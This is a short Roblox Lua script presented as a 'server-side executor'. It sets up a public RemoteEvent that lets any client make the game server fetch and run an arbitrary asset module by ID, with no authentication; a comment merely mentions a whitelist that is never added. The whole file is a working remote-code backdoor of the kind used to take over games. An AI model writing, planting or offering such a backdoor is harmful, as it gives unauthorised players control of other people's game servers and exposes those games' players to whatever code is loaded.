-- Mango SS: Server-Side Executor
local Remote = Instance.new("RemoteEvent")
Remote.Name = "MangoRemote"
Remote.Parent = game:GetService("ReplicatedStorage")

Remote.OnServerEvent:Connect(function(player, action, id)
    -- IMPORTANT: In a real project, you'd add your Ngrok whitelist check here.
    
    if action == "REQUIRE" then
        local assetId = tonumber(id)
        if assetId then
            print("Mango SS executing: " .. assetId)
            
            -- pcall prevents the whole script from crashing if the ID is invalid
            local success, err = pcall(function()
                -- Most SS modules require the player's name as an argument to load
                require(assetId)(player.Name) 
            end)
            
            if not success then
                warn("Mango SS Error: " .. tostring(err))
            end
        end
    end
end)
